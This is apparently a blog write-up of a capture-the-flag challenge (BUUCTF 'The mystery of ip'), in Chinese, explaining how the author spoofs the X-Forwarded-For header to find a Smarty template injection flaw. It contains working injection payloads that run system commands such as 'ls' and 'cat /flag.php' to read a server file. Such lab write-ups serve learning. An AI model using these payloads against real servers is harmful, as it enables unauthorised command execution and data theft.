# T11 happy NewYear

> 题目：BUUCTF [BJDCTF2020]The mystery of ip

_过年中整了点简单的（信我不是偷懒）_

__0x00 审题__

打开看见左上角有个flag，直接点开，里面写：'Your IP is xxxxx'

> 其中有个hint，点开原码得到：<!-- Do you know why i know your ip? -->

想到xff可以修改IP，使用抓包工具尝试

__0x01 解题__

1. 抓包，加入：X-Forwarded-For:123

> 发现回显即为：

```
Your IP is :123
```

> 接下来什么叫SSTI

2. 利用漏洞，构造合适的xff

> [关于SSTI漏洞](https://www.bbsmax.com/A/kPzONx33dx/),[详情](https://blog.csdn.net/qq_33608000/article/details/124813718)

推测其可能为：Smarty模板的SSTI漏洞&&Twig模版注入漏洞

尝试构造：

```
X-Forwarded-For:{7*6}
```

得到回显42

```
X-Forwarded-For:{system('ls')}
```

得到：

```
Your IP is : bootstrap
css
flag.php
header.php
hint.php
img
index.php
jquery
libs
templates_c
templates_c		
```

看到了flag.php

```
X-Forwarded-For:{system('cat /flag.php')}
```

得到答案

__0x02 总结__

1. 关于xff修改IP已经见过并用过了
2. 关于SSTI漏洞
